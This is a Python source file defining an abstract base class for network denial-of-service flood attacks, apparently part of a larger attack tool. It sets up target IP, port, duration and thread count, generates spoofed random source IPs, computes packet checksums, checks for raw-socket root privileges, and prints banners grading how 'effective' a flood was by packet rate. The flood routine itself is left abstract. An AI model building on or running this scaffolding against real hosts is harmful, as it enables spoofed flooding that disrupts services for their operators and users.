from __future__ import annotations
from abc import ABC, abstractmethod
import logging
import random
import socket
from colorama import Fore, Style, init
import time

# Initialize colorama for Windows compatibility
init(autoreset=True)

class AttackStrategy(ABC):
    def __init__(self, target_ip, target_port, duration=60, threads=50):
        """
        Initialize common attack parameters.
        
        Args:
            target_ip (str): The IP address of the target server
            target_port (int): The port number to attack
            duration (int): Duration of the attack in seconds (default: 60)
            threads (int): Number of threads to use for the attack (default: 50)
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.threads = threads
        self.packets_sent = 0
        self.attack_active = False
        self.logger = self._setup_logger()

    def _setup_logger(self):
        attack_name = self.__class__.__name__
        logger = logging.getLogger(f"{attack_name}_{self.target_ip}_{self.target_port}")
        logger.setLevel(logging.INFO)

        if logger.handlers:
            logger.handlers.clear()

        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)

        console_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        console_handler.setFormatter(console_formatter)

        logger.addHandler(console_handler)

        return logger

    def _print_colored(self, message, color=Fore.WHITE, style=Style.NORMAL, end="\n"):
        try:
            print(f"{style}{color}{message}{Style.RESET_ALL}", end=end)
        except (ImportError, AttributeError):
            print(message, end=end)

    def _print_header(self, message):
        self._print_colored(message, Fore.CYAN, Style.BRIGHT)

    def _print_success(self, message):
        self._print_colored(message, Fore.GREEN, Style.BRIGHT)

    def _print_warning(self, message):
        self._print_colored(message, Fore.YELLOW, Style.BRIGHT)

    def _print_error(self, message):
        self._print_colored(message, Fore.RED, Style.BRIGHT)

    def _print_info(self, message):
        self._print_colored(message, Fore.BLUE, Style.NORMAL)

    def generate_random_ip(self):
        ip = ".".join([str(random.randint(1, 254)) for _ in range(4)])
        self.logger.debug(f"Generated spoofed IP: {ip}")
        return ip

    def checksum(self, data):
        if len(data) % 2:
            data += b'\x00'

        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i + 1]

        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum += (checksum >> 16)
        return ~checksum & 0xFFFF

    def _check_raw_socket_privileges(self, protocol=socket.IPPROTO_TCP):
        try:
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, protocol)
            test_socket.close()
            self._print_success("✓ Raw socket privileges verified")
            self.logger.info("Raw socket privileges verified")
            return True
        except PermissionError:
            error_msg = "ERROR: This script requires administrator/root privileges to create raw sockets!"
            self._print_error(error_msg)
            self._print_warning("Please run as administrator (Windows) or with sudo (Linux/Mac)")
            self.logger.error(error_msg)
            return False
        except Exception as e:
            error_msg = f"Socket creation test failed: {e}"
            self._print_error(error_msg)
            self.logger.error(error_msg)
            return False

    def _display_attack_header(self):
        attack_name = self.__class__.__name__.replace('_', ' ').upper()
        self._print_header("=" * 60)
        self._print_header(f"{attack_name} ATTACK INITIATED")
        self._print_header("=" * 60)

        self._print_info(f"Target: {self.target_ip}:{self.target_port}")
        self._print_info(f"Duration: {self.duration} seconds")
        self._print_info(f"Threads: {self.threads}")

    def _display_attack_completion(self, start_time):
        total_time = time.time() - start_time
        avg_rate = self.packets_sent / total_time if total_time > 0 else 0
        attack_name = self.__class__.__name__.replace('_', ' ').upper()

        self._print_header("\n" + "=" * 60)
        self._print_success(f"{attack_name} ATTACK COMPLETED")
        self._print_header("=" * 60)

        self._print_info(f"Total packets sent: {self.packets_sent}")
        self._print_info(f"Total time: {total_time:.2f} seconds")
        self._print_info(f"Average rate: {avg_rate:.2f} packets per second")
        self._print_info(f"Target: {self.target_ip}:{self.target_port}")

        self.logger.info(f"{attack_name} attack completed")
        self.logger.info(f"Final statistics - Packets: {self.packets_sent}, Time: {total_time:.2f}s, Rate: {avg_rate:.2f} pps")

        if avg_rate > 1000:
            self._print_success("✓ HIGH INTENSITY - Likely effective")
        elif avg_rate > 500:
            self._print_warning("⚠ MEDIUM INTENSITY - Moderately effective")
        else:
            self._print_error("✗ LOW INTENSITY - May not be effective")

        estimated_bandwidth = (avg_rate * 1500 * 8) / 1000000
        self._print_info(f"Estimated bandwidth usage: {estimated_bandwidth:.2f} Mbps")

    def _get_rate_color(self, rate):
        if rate > 1000:
            return Fore.GREEN
        elif rate > 500:
            return Fore.YELLOW
        else:
            return Fore.RED

    @abstractmethod
    def attack(self):
        pass
